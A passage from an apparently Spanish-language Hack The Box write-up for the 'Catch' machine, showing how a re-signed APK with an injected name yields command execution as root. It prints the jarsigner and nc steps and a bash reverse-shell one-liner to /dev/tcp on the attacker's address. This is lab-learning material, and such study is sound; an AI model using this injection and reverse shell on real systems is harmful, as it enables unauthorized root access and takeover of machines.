(Nos pedir√° al inicio una contrase√±a, le pondremos cualquiera que nos guste, yo use `holahola` y los dem√°s datos tambi√©n son random, recordemos que no v√°lida nada de esto el script)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_keytool_APKwithIDtoNC.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La llave se llama `juguito_de_mora.keystore` y su alias es `mora`, ahora si firmemos el APK con `jarsigner` y esta llave:

```bash
‚ù± jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore juguito_de_mora.keystore catchv1.0.apk mora
```

Le pasamos al final los 3 elementos con los que contamos: nombre de llave, el archivo APK y el alias de la llave.

Nos pide la contrase√±a que asignamos, finalmente tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_jarsigner_APKwithIDtoNC.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Validamos por si algo:

```bash
‚ù± jarsigner -verify catchv1.0.apk

jar verified.
```

Tamos listos pal √∫ltimo paso.

üõ∏ Subir el APK a la m√°quina, levantar servidor sobre el puerto donde recibiremos el output del comando y ser felices obteniendo el `command-injection`:

Pong√°monos en escucha por el puerto `4450`:

```bash
‚ù± nc -lvp 4450
listening on [any] 4450 ...
```

Subimos el objeto a la m√°quina v√≠ctima, lo copiamos a la ruta `/opt/mdm/apk_bin/` y vemos si nuestras expectativas eran reales y `root` ejecuta el script:

.. .... Esperamos un rato.:..::

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_nc_rootID_commandInjection_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos el `id` del usuario **root**! As√≠ que encontramos una ejecuci√≥n de comandos como ese usuario en el sistema üòÅ

...

Para no hacer largo el writeup la idea es la misma para cualquier comando que quieras ejecutar, as√≠ que vamos a obtener una **Reverse Shell**...

Te dejo el script (me apoy√© del que explotamos) para generar el APK con cualquier comando (: (te invito a antes automatizarlo tu mismo, es solo acoplar lo ya visto)

> [apk_namejection.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/catch/apk_namejection.sh)

```bash
‚ù± ./apk_namejection.sh 'bash -i >& /dev/tcp/10.10.14.90/4450 0>&1'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450bash_rootRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tamos! Veamos las flags :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/catch/450flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Una muy linda m√°quina, el tema de las APIs fue entretenido, el c√≥mo aprovechamos el jugueteo de los `.env` muy ch√©vere y el movimiento lococh√≥n con lso nombres del APP me gustaron, una buena m√°quina con conceptos interesantes!

Nos leemos prontico, besitos y a seguir rompiendo de todoooooooooooooooooooooooooo! üòâ